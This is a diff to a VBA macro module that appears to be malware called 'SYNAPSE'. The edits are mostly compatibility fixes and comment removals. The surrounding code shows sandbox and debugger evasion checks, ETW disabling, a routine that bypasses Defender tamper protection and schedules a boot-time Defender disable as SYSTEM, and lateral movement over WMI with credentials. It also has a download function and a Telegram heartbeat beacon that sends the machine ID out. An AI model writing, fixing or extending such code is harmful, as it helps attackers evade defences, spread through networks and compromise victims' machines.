@@ -17,9 +17,6 @@ Option Explicit
     Private Declare PtrSafe Function GetCurrentThreadId Lib "kernel32" () As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
-#If Win64 Then
-    Private Declare PtrSafe Function GetTickCount64 Lib "kernel32" () As LongLong
-#End If
     Private Declare PtrSafe Function FindFirstFileW Lib "kernel32" (ByVal lpFileName As LongPtr, ByVal lpFindFileData As LongPtr) As LongPtr
     Private Declare PtrSafe Function FindNextFileW Lib "kernel32" (ByVal hFindFile As LongPtr, ByVal lpFindFileData As LongPtr) As Long
     Private Declare PtrSafe Function FindClose Lib "kernel32" (ByVal hFindFile As LongPtr) As Long
@@ -50,7 +47,6 @@ Option Explicit
     Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
     Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
-    Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As Any) As Long
     Private Declare PtrSafe Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Any, lpTotalNumberOfBytes As Any, lpTotalNumberOfFreeBytes As Any) As Long
     Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
     Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As LongPtr, ByVal cbMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
@@ -129,7 +125,6 @@ Option Explicit
     Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As Long
     Private Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
     Private Declare Function EmptyClipboard Lib "user32" () As Long
-    Private Declare Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As Any) As Long
     Private Declare Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Any, lpTotalNumberOfBytes As Any, lpTotalNumberOfFreeBytes As Any) As Long
     Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
     Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As Long, ByVal cbMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
@@ -296,7 +291,7 @@ Private m_PulseCounter As Long
 Private m_OriginalPerformance(3) As Variant
 
 ' ============================================================
-' 4. UTILITIES (no memory status; safe for all VBA)
+' 4. UTILITIES
 ' ============================================================
 Function GetTempDir() As String
     GetTempDir = Environ("TEMP")
@@ -778,38 +773,25 @@ Function IsSandbox() As Boolean
     Dim f As Variant
     Dim vp As Variant
     
-    ' Disk space check (minimum 64 GB)
+    ' Disk space check (minimum 64 GB) – safe step-by-step multiplication
     Dim freeBytes As Currency
     Dim totalBytes As Currency
     Dim ret As Long
     ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
-    Dim totalBytesLL As LongLong
-#If Win64 Then
-    If ret = 0 Then
-        totalBytesLL = 128 * 1024 * 1024 * 1024
-    Else
-        totalBytesLL = totalBytes
-    End If
-#Else
-    totalBytesLL = 128 * 1024 * 1024 * 1024
-#End If
-    If totalBytesLL < 64 * 1024 * 1024 * 1024 Then
+    Dim minSize As Currency
+    minSize = 64 * 1024
+    minSize = minSize * 1024
+    minSize = minSize * 1024
+    If totalBytes < minSize Then
         IsSandbox = True
         Exit Function
     End If
     
     ' Uptime check (at least 5 minutes)
-#If Win64 Then
-    If GetTickCount64() < 5 * 60 * 1000 Then
-        IsSandbox = True
-        Exit Function
-    End If
-#Else
     If GetTickCount() < 5 * 60 * 1000 Then
         IsSandbox = True
         Exit Function
     End If
-#End If
     
     ' Process count (at least 20)
 #If VBA7 Then
@@ -967,7 +949,6 @@ Sub KillETW()
     End If
 End Sub
 
-' ========== ENHANCED TAMPER PROTECTION BYPASS ==========
 Private Sub DisableTamperProtection()
     On Error Resume Next
     Dim wsh As Object
@@ -1001,7 +982,6 @@ Private Sub DisableTamperProtection()
     StealthSleep 2000
     fso.DeleteFile psFile
     
-    ' Scheduled task to disable Defender at boot (runs as SYSTEM)
     Dim xmlTask As String
     xmlTask = "<?xml version=""1.0"" encoding=""UTF-16""?>" & _
               "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & _
@@ -2710,7 +2690,6 @@ Private Function IsPortOpen(ip As String, port As Integer) As Boolean
     fso.DeleteFile psFile
 End Function
 
-' Enhanced lateral movement using direct WMI (no cmd.exe)
 Private Sub CopyToRemoteWMI(targetIP As String, username As String, password As String)
     On Error Resume Next
     Dim remotePath As String
@@ -3603,11 +3582,6 @@ End Sub
 #End If
     On Error Resume Next
     Dim pulse As Long
-#If Win64 Then
-    Dim uptime As LongLong
-#Else
-    Dim uptime As Long
-#End If
     If pGlobalHeap = 0 Then Exit Sub
     If pGlobalLock <> 0 Then EnterLock pGlobalLock
     CopyMemory pulse, ByVal pGlobalHeap + 8, 4
@@ -3616,13 +3590,9 @@ End Sub
     m_PulseCounter = pulse
     If pGlobalLock <> 0 Then LeaveLock pGlobalLock
     If m_PulseCounter Mod 60 = 0 Then
-#If Win64 Then
-        uptime = GetTickCount64()
-        SendToTelegram "SYNAPSE_HEARTBEAT|Machine=" & GetMachineID() & "|Pulse=" & m_PulseCounter & "|Uptime=" & uptime & "ms"
-#Else
+        Dim uptime As Long
         uptime = GetTickCount()
         SendToTelegram "SYNAPSE_HEARTBEAT|Machine=" & GetMachineID() & "|Pulse=" & m_PulseCounter & "|Uptime=" & uptime & "ms"
-#End If
     End If
     If m_PulseCounter Mod 600 = 0 Then PerformMemoryCleanup
     Debug.Print "[SYNAPSE ASYNC] Cycle: " & m_PulseCounter & " | Thread: " & GetCurrentThreadId()
